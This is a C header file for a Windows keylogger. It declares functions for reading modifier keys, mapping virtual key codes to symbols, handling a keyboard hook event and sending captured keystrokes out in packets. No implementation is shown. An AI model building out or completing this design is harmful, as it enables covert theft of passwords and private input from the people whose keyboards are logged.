#ifndef KEYLOGGER_KEYLOGGER_H
#define KEYLOGGER_KEYLOGGER_H

#include <windows.h>
#include <stdbool.h>
#include <stdint.h>

#define LOWERCASE_OFFSET 32
#define SYM_DELETE (-1)
#define SYM_BACKSPACE (-2)
#define SYM_ENTER (-3)

void getTimestamp(char* str);
bool CAPSLOCK();
bool SHIFT();
bool ALT();
bool CTRL();
bool CTRL_ALT();
int numKeySymbol(const char symbols[3]);
int misc2KeySymbol(const char symbols[2]);
int misc3KeySymbol(const char symbols[3]);
void sendPacket(char* body);
void handleTimestamp(uint32_t ksTime, char* body);
int getSymbol(int vkCode);
LRESULT OnKeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam);

#endif //KEYLOGGER_KEYLOGGER_H
